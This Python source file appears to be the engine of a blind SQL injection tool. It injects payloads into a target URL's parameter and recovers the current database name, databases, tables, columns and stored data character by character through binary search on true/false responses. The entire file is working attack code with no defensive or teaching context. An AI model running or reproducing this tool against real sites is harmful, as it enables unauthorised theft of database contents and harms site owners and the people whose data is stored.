# from lib.reqtest import reqtest
from lib.payloads import pd
from lib.core.attrDict import var
import config
import requests
import string

class test:
    def req(self,payload):
        proxy = {'http':'http://127.0.0.1:8080'}
        var.PARAM[var.INJERP] =var.PAYLOAD.format(payload)
        if var.METHOD == 'get':
            r = requests.get(url = var.URL,params=var.PARAM)
        else:
            r = requests.post(url=var.URL,data=var.PARAM)
        return r
    # 二分法
    def binpart(self,payloadcmp,payloadcur,charset):
        charset = list(charset)
        if type(charset[0]) == type(0):
            charset = [chr(i) for i in charset]
        charset.sort()
        def DBn(l,r):
            if r-l <= 1:
                req = self.req(payloadcur.format(ord(charset[l])) )
                if var.RIGHTF(self.freq, req):
                    return charset[l]
                else:
                    req = self.req(payloadcur.format(ord(charset[r])))
                    if var.RIGHTF(self.freq, req):
                        return charset[r]
                    else:
                        return -1
            mid = l+(r-l)//2
            req = self.req(payloadcmp.format(ord(charset[mid])))
            if var.RIGHTF(self.freq, req):
                return DBn(l,mid)
            else:
                return DBn(mid,r)
        return DBn(0,len(charset))
    def CurDB(self):
        self.freq = self.req(pd.plength.format(pl=pd.curdb,tj='<0#'))
        dbn = ord(self.binpart(pd.plength.format(pl=pd.curdb,tj='<{}#'),pd.plength.format(pl=pd.curdb,tj='={}#'),range(100)))
        dbname = ''
        for n in range(1,dbn+1):
            a = pd.pascii.format(pl=pd.curdb,tj='<{}#',n=n)
            ch = self.binpart(pd.pascii.format(pl=pd.curdb,tj='<{}#',n=n),pd.pascii.format(pl=pd.curdb,tj='={}#',n=n),string.printable)
            dbname += ch
        return dbname
    def DBs(self):
        self.freq = self.req(pd.plength.format(pl=pd.dbs,tj='<0#'))
        dbn = ord(self.binpart(pd.plength.format(pl=pd.dbs,tj='<{}#'), pd.plength.format(pl=pd.dbs,tj='={}#'), range(100)))
        dbname = ''
        for n in range(1, dbn + 1):
            ch = self.binpart(pd.pascii.format(pl=pd.dbs,tj='<{}#',n=n),pd.pascii.format(pl=pd.dbs,tj='={}#',n=n), string.printable)
            dbname += ch
        return dbname
    def TBs(self,db):
        self.freq = self.req(pd.plength.format(pl=pd.tbs.format(db=db),tj='<0#'))
        tbn = ord(self.binpart(pd.plength.format(pl=pd.tbs.format(db=db),tj='<{}#'), pd.plength.format(pl=pd.tbs.format(db=db),tj='={}#'), range(100)))
        tbname = ''
        for n in range(1, tbn + 1):
            ch = self.binpart(pd.pascii.format(pl=pd.tbs.format(db=db),tj='<{}#',n=n),pd.pascii.format(pl=pd.tbs.format(db=db),tj='={}#',n=n), string.printable)
            tbname += ch
        return tbname
    def CBs(self,db,tb):
        self.freq = self.req(pd.plength.format(pl=pd.cbs.format(db=db,tb=tb),tj='<0#'))
        tbn = ord(self.binpart(pd.plength.format(pl=pd.cbs.format(db=db,tb=tb),tj='<{}#'), pd.plength.format(pl=pd.cbs.format(db=db,tb=tb),tj='={}#'), range(100)))
        tbname = ''
        for n in range(1, tbn + 1):
            ch = self.binpart(pd.pascii.format(pl=pd.cbs.format(db=db,tb=tb),tj='<{}#',n=n),pd.pascii.format(pl=pd.cbs.format(db=db,tb=tb),tj='={}#',n=n), string.printable)
            tbname += ch
        return tbname
    def Ds(self,db,tb,cb):
        self.freq = self.req(pd.plength.format(pl=pd.ds.format(db=db,tb=tb,cb=cb),tj='<0#'))
        tbn = ord(self.binpart(pd.plength.format(pl=pd.ds.format(db=db,tb=tb,cb=cb),tj='<{}#'), pd.plength.format(pl=pd.ds.format(db=db,tb=tb,cb=cb),tj='={}#'), range(100)))
        tbname = ''
        for n in range(1, tbn + 1):
            ch = self.binpart(pd.pascii.format(pl=pd.ds.format(db=db,tb=tb,cb=cb),tj='<{}#',n=n),pd.pascii.format(pl=pd.ds.format(db=db,tb=tb,cb=cb),tj='={}#',n=n), string.printable)
            tbname += ch
        return tbname